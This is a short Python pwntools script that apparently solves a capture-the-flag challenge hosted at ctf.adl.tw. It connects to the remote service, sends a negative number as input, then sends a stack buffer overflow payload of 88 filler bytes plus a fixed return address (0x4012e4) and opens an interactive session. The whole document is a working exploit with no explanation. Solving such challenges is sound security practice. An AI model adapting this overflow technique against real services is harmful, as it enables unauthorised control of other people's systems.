from pwn import *

context.arch = 'amd64'
p = remote('ctf.adl.tw', 10005)
p.recvline()
p.sendline(b"salad")
p.recvline()
p.sendline(b"-1")
target_addr = 0x4012e4

payload = b"A" * 88 + p64(target_addr)
p.recvline()
p.sendline(payload)
p.interactive()
